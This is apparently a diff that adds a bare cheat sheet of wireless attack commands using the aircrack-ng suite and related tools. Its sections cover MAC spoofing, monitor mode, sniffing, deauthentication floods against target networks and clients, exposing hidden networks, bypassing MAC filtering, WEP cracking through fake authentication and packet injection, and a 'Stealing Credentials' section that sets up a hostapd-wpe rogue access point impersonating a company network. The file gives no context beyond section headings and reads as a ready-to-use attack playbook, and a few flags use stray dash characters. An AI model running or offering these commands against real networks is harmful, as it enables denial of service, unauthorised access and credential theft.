@@ -1,0 +1,85 @@
+--Change MAC Address:
+iwconfig
+ifconfig wlan0 down
+macchanger --random wlan0
+ifconfig wlan0 up
+ifconfig wlan0
+
+--Manage Monitor Mode:
+iwconfig
+airmon-ng
+airmon-ng start wlan0
+iwconfig mon0
+iwconfig wlan0
+airmon-ng stop mon0
+airmon-ng stop wlan0
+
+iwconfig wlan0
+ifconfig wlan0 down
+ifconfig wlan0 mode monitor
+ifconfig wlan0 up
+ifconfig wlan0
+airodump-ng wlan0
+
+airmon-ng
+ifconfig wlan0 down
+airmon-ng check kill
+airmon-ng start wlan0
+ifconfig wlan0
+iwconfig wlan0
+
+--Sniffing:
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng –channel 6 –bssid {bssid mac} –write out wlan0
+aireplay-ng --deauth 1000 -a {bssid mac} wlan0
+aireplay-ng --deauth 1000 -a {bssid mac} -c {Station target} wlan0 
+
+--Finding Hidden Network:
+airodump-ng wlan0
+airodump-ng --bssid {bssid} --channel {CH} wlan0
+aireplay-ng --deauth 0 -a {bssid} -c {station} wlan0
+
+--Bypassing Mac Filtering:
+airodump-ng wlan0
+airodump-ng --bssid {bssid} --channel {CH} wlan0
+ifconfig
+ifconfig wlan0 down
+macchanger -m xx.xx.xx.xx.xx.xx wlan0
+ifconfig wlan0 down
+
+---WEP Cracking Basic Case:
+
+-Key Finding:
+airodump-ng wlan0
+airodump-ng –-channel {CH} –-bssid {target mac} –-write out wlan0
+aircrack-ng out-01.cap
+
+-WEP Cracking Fake Auth:
+airodump-ng –-channel {CH} –-bssid {target mac} wlan0
+aireplay-ng --fakeauth 0 -a {target mac} -h {your mac} wlan0
+
+Packet injection ARP request reply:
+airodump-ng –-channel {CH} –-bssid {target mac} –-write out wlan0
+aireplay-ng --arpreplay -b {target mac} -h {your mac} wlan0
+
+Packet injection Korek chop chop:
+aireplay-ng --chopchop -b {target mac} -h {your mac} wlan0
+packetforge-ng -0 -a {target mac} -h {your mac} -k 255.255.255.255 -l 255.255.255.255 -y 1122out.xor -w chop-out
+
+--Stealing Credentials:
+apt-get install hostapd-wpe
+nano /etc/hostapd-wpe/hostapd-wpe.conf and edit ssid=Company-Network
+service network-manager stop
+hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+
+
+
+
+
+
+
+
+
+
+
